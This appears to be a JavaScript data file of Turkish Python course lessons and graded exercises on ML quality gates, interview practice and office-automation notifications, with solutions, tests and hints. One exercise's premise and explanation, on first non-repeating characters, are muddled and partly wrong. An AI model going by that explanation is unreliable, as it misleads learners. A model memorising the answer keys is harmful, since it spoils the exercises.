        hints: ['Son kaydı ayır; geri kalanı sondan başa gez.', 'reversed(gecmis[:-1]) en yakından en eskiye gider.', 'Durum ve etiket koşulunu birlikte denetle.'],
        why: 'Geri alma "bir önceki satır" demek değildir: arada başarısız ya da geri alınmış sürümler, aynı etiketin yeniden dağıtımları olabilir. Bu mantık CD aracında hazır olsa da kayıtların (dağıtım geçmişi) tutulması senin sorumluluğundadır.'
      },
      {
        t: 'code',
        id: 'kalite-ci-y9',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>kapi(aday, temel, tolerans=0.005)</code> model kalite kapısıdır: aday AUC, temel AUC\'den en fazla <code>tolerans</code> kadar düşük olabilir; aday gecikmesi temelin 1,2 katını aşamaz. Geçerse <code>(True, [])</code>, geçmezse <code>(False, nedenler)</code> döndürmeli. Şu anki kod daha kötü modelleri geçiriyor ve iyi modelleri reddediyor.</p>',
        start: 'def kapi(aday, temel, tolerans=0.005):\n    nedenler = []\n    if aday["auc"] > temel["auc"] - tolerans:\n        nedenler.append("auc düştü")\n    if aday["gecikme_ms"] > temel["gecikme_ms"] * 1.2:\n        nedenler.append("gecikme arttı")\n    return (len(nedenler) > 0, nedenler)\n',
        sol: 'def kapi(aday, temel, tolerans=0.005):\n    nedenler = []\n    if aday["auc"] < temel["auc"] - tolerans:\n        nedenler.append("auc düştü")\n    if aday["gecikme_ms"] > temel["gecikme_ms"] * 1.2:\n        nedenler.append("gecikme arttı")\n    return (len(nedenler) == 0, nedenler)\n',
        tests: 'T = {"auc": 0.850, "gecikme_ms": 40}\nassert kapi({"auc": 0.860, "gecikme_ms": 42}, T) == (True, []), "Daha iyi AUC ve kabul edilebilir gecikme geçmeli"\nassert kapi({"auc": 0.847, "gecikme_ms": 40}, T) == (True, []), "Tolerans içindeki küçük düşüş geçmeli"\nassert kapi({"auc": 0.830, "gecikme_ms": 40}, T) == (False, ["auc düştü"]), "0.02 düşüş reddedilmeli"\nassert kapi({"auc": 0.900, "gecikme_ms": 60}, T) == (False, ["gecikme arttı"]), "AUC iyi olsa da gecikme 48 ms sınırını aşıyor"\n',
        hints: ['İki ayrı hata var: biri karşılaştırma yönünde, biri dönüş değerinde.', 'İhlal koşulu "aday, temel eksi toleranstan KÜÇÜK" olmalı.', 'Geçti bilgisi "neden yok" demektir: len(nedenler) == 0.'],
        why: 'Kalite kapısındaki ters işaret en tehlikeli hatalardandır: CI yeşil yanar, kötü model prod\'a gider. Kapının kendisini de bilinen iyi ve kötü örneklerle test etmek bu yüzden şarttır.'
      },
      {
        t: 'code',
        id: 'kalite-ci-y10',
        stage: 'Meydan okuma',
        diff: 3,
        needs: ['pandas'],
        q: '<p>Dilim (segment) bazında kalite kapısı. Genel başarı iyi görünse de bir müşteri segmentinde model çökebilir. <code>dilim_kapisi(df, esik=0.05)</code> yaz: <code>df</code> sütunları <code>segment</code>, <code>y</code> (gerçek 0/1), <code>temel</code> ve <code>aday</code> (tahmin 0/1). Her segment için doğruluğu (accuracy) hesapla; adayın doğruluğu temelinkinden <code>esik</code>\'ten <b>fazla</b> düşen segmentlerin adlarını sıralı liste olarak döndür. Gerçek veri: Ilgaz Bank müşterilerinin <code>segment</code> sütunu.</p>',
        start: 'import pandas as pd\n\ndef dilim_kapisi(df, esik=0.05):\n    return []\n',
        sol: 'import pandas as pd\n\ndef dilim_kapisi(df, esik=0.05):\n    d = df.assign(t_dogru=(df["temel"] == df["y"]).astype(float),\n                  a_dogru=(df["aday"] == df["y"]).astype(float))\n    ozet = d.groupby("segment")[["t_dogru", "a_dogru"]].mean()\n    kotu = ozet[ozet["a_dogru"] < ozet["t_dogru"] - esik]\n    return sorted(kotu.index.tolist())\n',
        tests: 'import veri\nimport numpy as np\nm = veri.oku("ilgaz_bank", "bank_customers")\nrng = np.random.default_rng(3)\ny = (m["risk_score"] > m["risk_score"].median()).astype(int).to_numpy()\ntemel = np.where(rng.random(len(m)) < 0.85, y, 1 - y)\naday = temel.copy()\nsegs = m["segment"].to_numpy()\nhedef = sorted(set(segs))[0]\nbozuk = (segs == hedef) & (rng.random(len(m)) < 0.3)\naday[bozuk] = 1 - y[bozuk]\ndf = pd.DataFrame({"segment": segs, "y": y, "temel": temel, "aday": aday})\ngenel_t = (df.temel == df.y).mean(); genel_a = (df.aday == df.y).mean()\nsonuc = dilim_kapisi(df)\nassert sonuc == [hedef], f"Yalnız {hedef!r} segmenti yakalanmalı, gelen {sonuc}"\nassert dilim_kapisi(df.assign(aday=df.temel)) == [], "Aday temel ile aynıysa hiçbir segment düşmez"\nassert dilim_kapisi(df, esik=0.5) == [], "Çok gevşek eşikte hiçbir segment takılmamalı"\n',
        hints: ['Önce her satır için temel ve adayın doğru olup olmadığını 0/1 sütun olarak ekle.', 'groupby("segment") ile iki sütunun ortalaması segment doğruluğudur.', 'ozet[ozet.a_dogru < ozet.t_dogru - esik].index'],
        why: 'Ortalama, küçük bir segmentteki çöküşü gizler; genel doğruluk birkaç puan düşer ama o segmentteki müşteriler için model işe yaramaz hâle gelir. Olgun ML hatlarında kalite kapısı hem genel hem dilim bazında kural içerir (ml-pipeline-degerlendirme dersindeki hata dilimi analizi).'
      }
    ],
    faq: [
      {
        q: 'Staging ortamı prod\'un birebir kopyası olmak zorunda mı?',
        a: 'Aynı imaj, aynı altyapı türü (aynı veritabanı motoru ve sürümü, aynı ters vekil) ve benzer yapılandırma olmalı; boyut ve veri hacmi küçük olabilir. Prod verisini staging\'e kopyalamak KVKK riski taşır; maskeleyerek ya da sentetik veriyle doldur.'
      },
      {
        q: 'GitHub Actions dışında hangi CD araçları var?',
        a: 'GitLab CI/CD, CircleCI, Jenkins, Azure Pipelines genel amaçlı hatlardır. Kubernetes dünyasında Argo CD ve Flux "GitOps" yaklaşımıyla çalışır: istenen durum bir git deposunda tutulur, araç kümeyi o depoya eşitler; geri alma bir git revert\'tür.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'mulakat-hazirlik' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'mulakat-hazirlik',
    min: 30,
    html: `<p>Bu ders her rol için ortak çekirdeği veriyor: Python kavramları, algoritma kalıpları, canlı kodlama ve davranışsal sorular. Ama bir veri analisti ile bir backend geliştiricinin mülakatı aynı değildir. Bu bölüm iki şey ekliyor: öğrenme yoluna göre "hangi bölüm sana ne kadar lazım" haritası ve kendi kendine uygulayabileceğin 45 dakikalık bir deneme mülakatı senaryosu.</p>
<h2>Öğrenme yollarına göre harita</h2>
<div class="tbl-wrap"><table><tr><th>Yol</th><th>Bu dersten öncelik</th><th>Ardından çalış</th><th>Mülakatta ağırlık</th></tr>
<tr><td>Veri analisti</td><td>Kavram soruları, sözlükle sayım, davranışsal sorular</td><td><b>Veri mülakatı</b> (SQL, pandas, metrik, vaka), <b>İş metrikleri</b></td><td>SQL canlı yazım, pandas ile analiz, iş sorusunu metriğe çevirme</td></tr>
<tr><td>Veri bilimci / ML</td><td>Kavramlar, Big-O, kayan pencere, heap</td><td><b>Veri mülakatı</b>, ML derslerindeki SSS'ler</td><td>İstatistik, model değerlendirme, sızıntı, A/B testi, ev ödevi</td></tr>
<tr><td>Veri mühendisi</td><td>Kalıpların tamamı, Big-O, ev ödevi</td><td><b>Veri mülakatı</b>, <b>Mülakat kalıpları 2</b>, <b>Sistem tasarımı</b></td><td>SQL, ETL tasarımı, idempotentlik, bölümleme, orkestrasyon</td></tr>
<tr><td>Backend / web</td><td>Kalıpların tamamı, canlı kodlama ipuçları</td><td><b>Mülakat kalıpları 2</b>, <b>Sistem tasarımı</b></td><td>Algoritma (orta), API ve veritabanı tasarımı, önbellek, güvenlik</td></tr>
<tr><td>AI mühendisi</td><td>Kavramlar, sözlük/küme kalıpları, ev ödevi</td><td><b>Sistem tasarımı</b> (LLM servisleri), LLM dersleri</td><td>RAG tasarımı, değerlendirme, maliyet ve gecikme</td></tr>
<tr><td>Otomasyon</td><td>Kavramlar, sayım ve metin kalıpları</td><td>Python Arena (Kolay/Orta)</td><td>Dosya, Excel, hata yönetimi; çoğunlukla pratik görev</td></tr>
<tr><td>Sertifika (PCEP/PCAP)</td><td>Kavram soruları ve "yanlış ama sık verilen cevaplar"</td><td><b>Mülakat kalıpları 2</b>, sınav bölümü</td><td>Dil ayrıntısı: kapsam, değişebilirlik, istisnalar, OOP</td></tr></table></div>
<p>Haritayı şöyle kullan: kendi satırındaki ilk sütunu bu derste pekiştir, ikinci sütundaki dersleri sırayla bitir, üçüncü sütunu deneme mülakatlarında ağırlık olarak kullan. Python Arena'da rolüne uygun alan süzgeciyle günde 1-2 soru çözmek, kalıpları otomatikleştirmenin en verimli yoludur.</p>
<h2>45 dakikalık deneme mülakatı</h2>
<p>Gerçek teknik mülakatların çoğu 45-60 dakikadır ve benzer bir akışı izler. Bir arkadaşınla rol değiştirerek ya da kendi kendine süre tutarak uygula; ekranını kaydet ve sonra izle. Senaryo Anadolu Market'in backend/veri pozisyonuna göre yazıldı.</p>
<div class="tbl-wrap"><table><tr><th>Dakika</th><th>Bölüm</th><th>Görüşmeci ne yapar?</th><th>Sen ne yapmalısın?</th></tr>
<tr><td>0-5</td><td>Tanışma</td><td>"Kendinden ve son projenden bahset."</td><td>90 saniyelik hazır özet: kim, ne yaptın, hangi sonuç</td></tr>
<tr><td>5-10</td><td>Kavram ısınması</td><td>2-3 kısa soru: değişebilirlik, üreteç, GIL</td><td>Kısa tanım + örnek; bilmediğini kabul et ama akıl yürüt</td></tr>
<tr><td>10-35</td><td>Canlı kodlama</td><td>Bir problem, sonra bir takip sorusu</td><td>Netleştir → örnek → kaba çözüm → iyileştir → test et</td></tr>
<tr><td>35-40</td><td>Tasarım/vaka</td><td>"Bunu günde 10 milyon siparişe nasıl ölçeklersin?"</td><td>Darboğazı adlandır, iki seçenek ve ödünleşimini söyle</td></tr>
<tr><td>40-45</td><td>Senin soruların</td><td>"Sormak istediğin bir şey var mı?"</td><td>Ekip, kod inceleme, yayın süreci üzerine 2 hazır soru</td></tr></table></div>
<h3>Canlı kodlama problemi (25 dakika)</h3>
<p><b>Görev:</b> "Sipariş akışında her sipariş <code>(musteri_id, zaman_sn)</code> olarak geliyor. Son 60 saniyede 3'ten fazla sipariş veren müşterileri, sınırı ilk aştıkları an itibarıyla raporla." <b>Takip sorusu:</b> "Akış sıralı gelmiyorsa ne değişir? Bellek sınırlıysa?"</p>
<pre class="py">from collections import defaultdict, deque

def supheliler(siparisler, pencere=60, sinir=3):
    son = defaultdict(deque)          # müşteri -&gt; penceredeki zamanlar
    bulunan = {}
    for musteri, t in siparisler:     # zaman sırasıyla geldiğini varsayıyoruz (netleştir!)
        q = son[musteri]
        q.append(t)
        while q[0] &lt;= t - pencere:    # pencereden çıkanları at
            q.popleft()
        if len(q) &gt; sinir and musteri not in bulunan:
            bulunan[musteri] = t
    return bulunan

akis = [(7, 0), (7, 10), (9, 12), (7, 30), (7, 55), (9, 70), (7, 61), (7, 62)]
print(supheliler(akis))</pre>
<p>Değerlendirme ölçütleri: Soruyu netleştirdin mi (pencere dahil mi, sıralı mı)? Kaba çözümü söyleyip (her siparişte tüm geçmişi taramak, O(n²)) iyileştirdin mi? Karmaşıklığı söyledin mi (her zaman en fazla bir kez eklenip çıkarılır: O(n) zaman, O(müşteri × pencere) bellek)? Kenar durumları denedin mi (aynı saniyede sipariş, tam 60 saniye sınırı)?</p>
<h3>Kendini puanla</h3>
<div class="tbl-wrap"><table><tr><th>Ölçüt</th><th>1 (zayıf)</th><th>3 (iyi)</th></tr>
<tr><td>Problem çözme</td><td>Doğrudan koda atladı, varsayım sormadı</td><td>Netleştirdi, örnek üzerinde düşündü, alternatifleri tarttı</td></tr>
<tr><td>Kod</td><td>Çalışmadı ya da okunmuyor</td><td>Çalışıyor, adlar anlamlı, fonksiyonlara bölünmüş</td></tr>
<tr><td>İletişim</td><td>Sessiz yazdı</td><td>Düşündüğünü sesli anlattı, ipucunu kullandı</td></tr>
<tr><td>Test</td><td>Hiç denemedi</td><td>Kendi örnekleriyle ve kenar durumlarla denedi</td></tr>
<tr><td>Karmaşıklık</td><td>Bilmiyor</td><td>Zaman ve bellek için doğru O(...) ve gerekçe</td></tr></table></div>
<div class="tip"><b>Haftalık plan</b>Mülakat sürecindeysen haftada iki deneme yap: biri bu senaryoyla, biri Python Arena'dan rastgele bir Orta soruyla. Her denemeden sonra en düşük puanlı ölçüt için bir sonraki haftaya tek bir hedef yaz ("kodlamadan önce iki örnek yazacağım").</div>
<div class="note"><b>Gerçek işte</b>İşe alım ekipleri adayı tek bir doğru cevaptan çok sürece göre değerlendirir: belirsizlik karşısında soru sorması, takıldığında ilerleyebilmesi ve kendi kodunu test etmesi. Bu yüzden deneme mülakatı, soru ezberlemekten çok daha verimli bir hazırlıktır.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'mulakat-hazirlik-y1',
        stage: 'Isınma',
        q: 'Veri analisti pozisyonuna hazırlanıyorsun ve iki haftan var. Bu yolun haritasına göre en verimli öncelik hangisi?',
        o: [
          'Dinamik programlama ve graf algoritmalarına ağırlık vermek',
          'SQL ve pandas ile canlı analiz ile iş sorusunu metriğe çevirme',
          'Kubernetes ve dağıtım araçlarını öğrenmek',
          'Metaprogramlama ve tanımlayıcıları (descriptor) çalışmak'
        ],
        a: 1,
        why: 'Analist mülakatlarının ağırlığı SQL\'de canlı sorgu, pandas ile analiz ve iş metriği yorumudur; Veri mülakatı ve İş metrikleri dersleri bunu hedefler. Zor algoritmalar ve altyapı konuları bu rolde nadiren sorulur.'
      },
      {
        t: 'mc',
        id: 'mulakat-hazirlik-y2',
        stage: 'Isınma',
        q: 'Canlı kodlamada problemi okudun ve hemen bir çözüm aklına geldi. İlk ne yapmalısın?',
        o: [
          'Görüşmeciyi bekletmemek için hemen kodlamaya başlamak',
          'Girdi ve kenar durumları sorup örnekle yaklaşımı anlatmak',
          'Önce en iyi çözümü bulana kadar uzun süre sessizce düşünmek',
          'Benzer bir LeetCode sorusunun numarasını söylemek'
        ],
        a: 1,
        why: 'Netleştirme ve yaklaşımı anlatma, hem yanlış problemi çözme riskini azaltır hem de görüşmecinin değerlendirdiği iletişim ölçütünü doldurur. Sessiz düşünme ve doğrudan kodlama en sık düşük puan nedenlerindendir.'
      },
      {
        t: 'predict',
        id: 'mulakat-hazirlik-y3',
        stage: 'Kodu oku',
        q: 'Deneme mülakatındaki çözüm: bu akış için ne yazdırır?',
        o: ['{7: 55}', '{7: 61}', '{7: 62}', '{7: 55, 9: 70}'],
        a: 0,
        code: 'from collections import defaultdict, deque\n\ndef supheliler(siparisler, pencere=60, sinir=3):\n    son = defaultdict(deque)\n    bulunan = {}\n    for musteri, t in siparisler:\n        q = son[musteri]\n        q.append(t)\n        while q[0] <= t - pencere:\n            q.popleft()\n        if len(q) > sinir and musteri not in bulunan:\n            bulunan[musteri] = t\n    return bulunan\n\nprint(supheliler([(7, 0), (7, 10), (9, 12), (7, 30), (7, 55), (9, 70), (7, 61), (7, 62)]))\n',
        why: '55. saniyede müşteri 7\'nin penceresinde 0, 10, 30, 55 vardır (55 - 60 = -5 ve 0 > -5): dört sipariş, sınır 3 aşılır. 61\'de 0 pencereden çıkar ama müşteri zaten bulunmuştur. Müşteri 9\'un yalnız iki siparişi vardır.'
      },
      {
        t: 'order',
        id: 'mulakat-hazirlik-y4',
        stage: 'Kodu oku',
        q: '<p>Deneme mülakatı puan kartını hesaplayan programın satırlarını sırala: ölçüt puanlarının ortalamasını al ve en zayıf ölçütü yazdır. Beklenen çıktı:</p><pre class="out">ortalama 2.2 | geliştir: test</pre>',
        lines: [
          'puanlar = {"problem": 3, "kod": 2, "iletisim": 3, "test": 1, "karmasiklik": 2}',
          'ortalama = sum(puanlar.values()) / len(puanlar)',
          'zayif = min(puanlar, key=puanlar.get)',
          'print(f"ortalama {ortalama:.1f} | geliştir: {zayif}")'
        ],
        expect: 'ortalama 2.2 | geliştir: test\n',
        hint: 'Sözlük önce tanımlanmalı; hesaplar ondan sonra, yazdırma en sonda.',
        why: 'min(sozluk, key=sozluk.get) değeri en küçük anahtarı verir. Her denemeden sonra tek bir zayıf ölçüte odaklanmak, hazırlığı ölçülebilir kılar.'
      },
      {
        t: 'code',
        id: 'mulakat-hazirlik-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Deneme mülakatının takip sorusu: akış <b>sırasız</b> gelebilir. <code>supheliler_sirasiz(siparisler, pencere=60, sinir=3)</code> yaz: tüm siparişler elindeyse, her müşteri için zamanlarını sıralayıp herhangi bir <code>pencere</code> saniyelik yarı açık aralıkta (<code>(t - pencere, t]</code>) <code>sinir</code>\'dan fazla sipariş olan ilk anı bul. <code>{musteri: ilk_an}</code> döndür.</p>',
        guide: [
          'Siparişleri müşteriye göre grupla (defaultdict(list)).',
          'Her müşterinin zamanlarını sırala.',
          'İki işaretçi (sol, sağ) ile kayan pencere: sağ ilerlerken zaman[sol] <= zaman[sağ] - pencere oldukça sol\'u ilerlet.',
          'Pencere boyu sağ - sol + 1 sınırı aşınca o zamanı kaydet ve o müşteriyi bırak.'
        ],
        example: 'z = [1, 2, 5, 9, 10]\nsol = 0\nfor sag in range(len(z)):\n    while z[sol] <= z[sag] - 4:\n        sol += 1\n    print(z[sag], sag - sol + 1)\n',
        start: 'from collections import defaultdict\n\ndef supheliler_sirasiz(siparisler, pencere=60, sinir=3):\n    gruplar = defaultdict(list)\n    # TODO: grupla\n    sonuc = {}\n    for musteri, zamanlar in gruplar.items():\n        zamanlar.sort()\n        # TODO: iki işaretçili pencere\n    return sonuc\n',
        sol: 'from collections import defaultdict\n\ndef supheliler_sirasiz(siparisler, pencere=60, sinir=3):\n    gruplar = defaultdict(list)\n    for musteri, t in siparisler:\n        gruplar[musteri].append(t)\n    sonuc = {}\n    for musteri, zamanlar in gruplar.items():\n        zamanlar.sort()\n        sol = 0\n        for sag in range(len(zamanlar)):\n            while zamanlar[sol] <= zamanlar[sag] - pencere:\n                sol += 1\n            if sag - sol + 1 > sinir:\n                sonuc[musteri] = zamanlar[sag]\n                break\n    return sonuc\n',
        tests: 'akis = [(7, 62), (9, 70), (7, 30), (7, 0), (9, 12), (7, 55), (7, 10), (7, 61)]\nassert supheliler_sirasiz(akis) == {7: 55}, "Sırasız akışta da müşteri 7 55. saniyede yakalanmalı"\nassert supheliler_sirasiz([(1, 0), (1, 60), (1, 120), (1, 180)]) == {}, "Tam 60 sn aralık pencereye girmez (yarı açık)"\nassert supheliler_sirasiz([(2, 5)] * 4) == {2: 5}, "Aynı saniyede 4 sipariş"\nassert supheliler_sirasiz([]) == {}, "Boş akış"\n',
        hints: ['Sıralama sonrası problem, sıralı bir dizide kayan pencereye dönüşür.', 'Sol işaretçi yalnız ileri gider; toplam iş O(n log n) (sıralama) + O(n).', 'while zamanlar[sol] <= zamanlar[sag] - pencere: sol += 1'],
        why: 'Takip sorusunda beklenen, kısıtı değiştirince veri yapısını yeniden seçebilmendir: sırasız ama tam veri varsa sırala + iki işaretçi; sonsuz akışta ise olay zamanına göre tampon ve gecikme sınırı (watermark) gerekir.'
      },
      {
        t: 'code',
        id: 'mulakat-hazirlik-y6',
        stage: 'Kendin yaz',
        diff: 1,
        q: '<p>Yol haritasını koda dök: <code>calisma_plani(yol, bitenler)</code> yaz. <code>HARITA</code> sözlüğü hazır: her yol için sıralı ders listesi. Yoldaki derslerden <code>bitenler</code> kümesinde olmayanları sırayla döndür. Bilinmeyen yol için <code>ValueError</code> fırlat; mesajda geçerli yollar alfabetik ve virgülle ayrılmış olsun.</p>',
        start: 'HARITA = {\n    "analist": ["mulakat-hazirlik", "veri-mulakat", "is-metrikleri"],\n    "backend": ["mulakat-hazirlik", "mulakat-kaliplari-2", "sistem-tasarimi"],\n    "muhendis": ["mulakat-hazirlik", "veri-mulakat", "mulakat-kaliplari-2", "sistem-tasarimi"],\n}\n\ndef calisma_plani(yol, bitenler):\n    pass\n',
        sol: 'HARITA = {\n    "analist": ["mulakat-hazirlik", "veri-mulakat", "is-metrikleri"],\n    "backend": ["mulakat-hazirlik", "mulakat-kaliplari-2", "sistem-tasarimi"],\n    "muhendis": ["mulakat-hazirlik", "veri-mulakat", "mulakat-kaliplari-2", "sistem-tasarimi"],\n}\n\ndef calisma_plani(yol, bitenler):\n    if yol not in HARITA:\n        raise ValueError("Geçerli yollar: " + ", ".join(sorted(HARITA)))\n    return [d for d in HARITA[yol] if d not in bitenler]\n',
        tests: 'assert calisma_plani("backend", {"mulakat-hazirlik"}) == ["mulakat-kaliplari-2", "sistem-tasarimi"], "Biten ders çıkarılmalı, sıra korunmalı"\nassert calisma_plani("analist", set()) == ["mulakat-hazirlik", "veri-mulakat", "is-metrikleri"], "Hiç bitmemişse tüm liste"\nassert calisma_plani("muhendis", set(HARITA["muhendis"])) == [], "Hepsi bittiyse boş"\ntry:\n    calisma_plani("tasarimci", set())\n    assert False, "Bilinmeyen yol ValueError vermeli"\nexcept ValueError as e:\n    assert str(e) == "Geçerli yollar: analist, backend, muhendis", f"Mesaj: {e}"\n',
        hints: ['Önce yol anahtarını denetle.', 'Liste kavrayışı ile sırayı koruyarak süz.', '", ".join(sorted(HARITA))'],
        why: 'Basit bir görev, ama mülakatta da beklenen iki alışkanlığı içerir: geçersiz girdide anlamlı hata mesajı ve sırayı koruyan süzme.'
      },
      {
        t: 'code',
        id: 'mulakat-hazirlik-y7',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. Adayın canlı kodlamada yazdığı <code>ilk_tekrarsiz(metin)</code>, bir metinde yalnız bir kez geçen <b>ilk</b> karakteri döndürmeli; yoksa <code>None</code>. Görüşmeci "Peki <code>"anadolu"</code> için?" diye soruyor ve fonksiyon yanlış cevap veriyor. Hem doğruluk hem O(n) karmaşıklık beklenir.</p>',
        start: 'def ilk_tekrarsiz(metin):\n    for i, ch in enumerate(metin):\n        if ch not in metin[i + 1:]:\n            return ch\n    return None\n',
        sol: 'from collections import Counter\n\ndef ilk_tekrarsiz(metin):\n    sayac = Counter(metin)\n    for ch in metin:\n        if sayac[ch] == 1:\n            return ch\n    return None\n',
        tests: 'assert ilk_tekrarsiz("anadolu") == "n", "\'a\' tekrar eder; ilk tekrarsız \'n\'"\nassert ilk_tekrarsiz("market") == "m", "Hiç tekrar yoksa ilk karakter"\nassert ilk_tekrarsiz("aabb") is None, "Tekrarsız yoksa None"\nassert ilk_tekrarsiz("") is None, "Boş metin"\nassert ilk_tekrarsiz("x" * 50000 + "y") == "y", "Uzun girdide doğru ve hızlı olmalı"\n',
        hints: ['Kod yalnız sağa bakıyor; soldaki tekrarları görmüyor. Üstelik her adımda dilim kopyalıyor: O(n²).', 'Önce tüm karakterleri say, sonra metni baştan gez.', 'Counter(metin) ve sayac[ch] == 1.'],
        why: '"anadolu"da son "a" kendinden sonra tekrar etmediği için yanlış kod onu... aslında ilk "a"yı atlar ama "n"yi bulur gibi görünür; asıl hata "d o l u" gibi sona yakın karakterlerde ortaya çıkar ve uzun girdide O(n²) zaman aşımı verir. İki geçişli sayım hem doğru hem O(n)\'dir; mülakatta kenar durumları ve büyük girdiyi kendin denemek bu hatayı yakalar.'
      },
      {
        t: 'code',
        id: 'mulakat-hazirlik-y8',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>45 dakikalık mülakatı zaman çizelgesiyle planla: <code>zaman_cizelgesi(bolumler, baslangic="14:00")</code> yaz. <code>bolumler</code> <code>(ad, dakika)</code> listesidir. Her bölüm için <code>"HH:MM-HH:MM ad"</code> metni üret. Toplam süre 45 dakikayı aşarsa, en uzun bölümden (eşitlikte listede önce gelen) aşan dakikaları düş; bu bölüm 10 dakikanın altına inecekse <code>ValueError</code> fırlat. Saat 24:00\'ü geçerse 00:00\'dan devam etsin.</p>',
        start: 'def zaman_cizelgesi(bolumler, baslangic="14:00"):\n    return []\n',
        sol: 'def zaman_cizelgesi(bolumler, baslangic="14:00"):\n    bolumler = [list(b) for b in bolumler]\n    fazla = sum(d for _, d in bolumler) - 45\n    if fazla > 0:\n        i = max(range(len(bolumler)), key=lambda k: (bolumler[k][1], -k))\n        if bolumler[i][1] - fazla < 10:\n            raise ValueError("en uzun bölüm 10 dakikanın altına iner")\n        bolumler[i][1] -= fazla\n    s, d = map(int, baslangic.split(":"))\n    t = s * 60 + d\n    fmt = lambda m: f"{(m // 60) % 24:02d}:{m % 60:02d}"\n    sonuc = []\n    for ad, dk in bolumler:\n        sonuc.append(f"{fmt(t)}-{fmt(t + dk)} {ad}")\n        t += dk\n    return sonuc\n',
        tests: 'B = [("Tanışma", 5), ("Kavram", 5), ("Kodlama", 25), ("Tasarım", 5), ("Sorular", 5)]\nassert zaman_cizelgesi(B) == ["14:00-14:05 Tanışma", "14:05-14:10 Kavram", "14:10-14:35 Kodlama", "14:35-14:40 Tasarım", "14:40-14:45 Sorular"], "Tam 45 dakika"\nuzun = [("Tanışma", 10), ("Kodlama", 30), ("Tasarım", 10)]\nassert zaman_cizelgesi(uzun, "09:30")[1] == "09:40-10:05 Kodlama", "5 dakika fazlalık en uzun bölümden düşülmeli"\nassert zaman_cizelgesi([("A", 20), ("B", 20)], "23:50") == ["23:50-00:10 A", "00:10-00:30 B"], "Gece yarısı geçişi"\ntry:\n    zaman_cizelgesi([("A", 15), ("B", 15), ("C", 15), ("D", 15)])\n    assert False, "15 dakika fazlalık bir bölümü 0\'a indirir: ValueError"\nexcept ValueError:\n    pass\n',
        hints: [
          'Dakikayı tek bir sayı olarak (gün başından itibaren) tut; biçimlendirmede // 60 ve % 60 kullan.',
          'En uzun bölümün indeksini max(range(n), key=lambda k: (dakika, -k)) ile bul (eşitlikte ilk).',
          'Saat için (dakika // 60) % 24.'
        ],
        why: 'Zaman hesabını dakikaya indirip sonda biçimlendirmek, saat ve gün geçişlerindeki hataları ortadan kaldırır. Mülakatta da "zaman, para ve tarih için tek birime indir" ilkesi sık beklenen bir olgunluk işaretidir.'
      }
    ],
    faq: [
      {
        q: 'Deneme mülakatı için kimle çalışabilirim?',
        a: 'Aynı yoldaki bir arkadaşla rol değiştirerek; yoksa süre tutup kendini kaydederek. Görüşmeci rolündeyken puan kartını doldurmak, kendi zayıflıklarını görmek için de etkilidir. Topluluklar ve mentorluk programları da karşılıklı deneme oturumları düzenler.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'ofis-otomasyon' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'ofis-otomasyon',
    min: 25,
    html: `<p>Zamanlanmış bir betik sessizce başarısız olursa, sorunu genellikle bir yönetici "rapor neden gelmedi?" diye sorduğunda öğrenirsin. Bu bölüm iki eksiği kapatıyor: her çalıştırmanın sonunda bir <b>çalışma özeti</b> üretmek ve hata olduğunda <b>bildirim</b> göndermek (Teams/Slack webhook ve e-posta); ardından Windows Görev Zamanlayıcı'nın "neden elle çalışıyor da zamanlanınca çalışmıyor" tuzakları.</p>
<h2>Çalışma özeti: her çalıştırma bir kayıt</h2>
<p>Betiğin ana gövdesini bir sarmalayıcıya al: başlangıç-bitiş zamanı, işlenen ve atlanan dosya sayısı, uyarılar ve durum tek bir sözlükte toplansın. Bu özet hem loga, hem bildirime, hem de (istersen) bir CSV'ye "çalışma geçmişi" olarak yazılır.</p>
<pre class="py">import json, traceback
from datetime import datetime

def calistir(is_fonksiyonu, ad, simdi=datetime.now):
    ozet = {"is": ad, "baslangic": simdi().isoformat(timespec="seconds"), "durum": "BAŞARILI",
            "islenen": 0, "atlanan": 0, "uyarilar": []}
    try:
        is_fonksiyonu(ozet)                    # iş, sayaçları ve uyarıları özete yazar
        if ozet["uyarilar"]:
            ozet["durum"] = "UYARILI"
    except Exception as e:
        ozet["durum"] = "HATA"
        ozet["hata"] = f"{type(e).__name__}: {e}"
        ozet["iz"] = traceback.format_exc(limit=3)
    ozet["bitis"] = simdi().isoformat(timespec="seconds")
    return ozet

def rapor_isi(ozet):
    for ad in ["ocak.xlsx", "subat.xlsx", "~$mart.xlsx"]:
        if ad.startswith("~$"):                # Excel'in açık dosya kilidi
            ozet["atlanan"] += 1
            ozet["uyarilar"].append(f"{ad} kilit dosyası, atlandı")
            continue
        ozet["islenen"] += 1

sabit = lambda: datetime(2024, 11, 4, 8, 30)
ozet = calistir(rapor_isi, "aylik_rapor", sabit)
print(json.dumps({k: v for k, v in ozet.items() if k != "iz"}, ensure_ascii=False))</pre>
<h2>Bildirim: webhook ve e-posta</h2>
<p>Microsoft Teams ve Slack, bir kanala dışarıdan mesaj göndermek için <b>gelen webhook</b> (incoming webhook) adresi verir: bu adrese JSON ile POST atarsın, mesaj kanala düşer. Teams'te yeni yol "Workflows" uygulamasındaki "webhook isteği alındığında kanala gönder" akışıdır; eski Office 365 bağlayıcıları kaldırılmaktadır. Adres bir parola gibidir: bilen herkes kanala mesaj atabilir, bu yüzden ortam değişkeninde tutulur.</p>
<pre class="code">import os, json, urllib.request

def webhook_gonder(ozet):
    govde = {"text": f"[{ozet['durum']}] {ozet['is']}: {ozet['islenen']} işlendi, "
                     f"{ozet['atlanan']} atlandı" + (f"\\nHata: {ozet['hata']}" if "hata" in ozet else "")}
    istek = urllib.request.Request(os.environ["TEAMS_WEBHOOK_URL"], data=json.dumps(govde).encode("utf-8"),
                                   headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(istek, timeout=10) as y:
            return y.status
    except OSError as e:
        print("Bildirim gönderilemedi:", e)    # bildirim hatası asıl işi düşürmesin</pre>
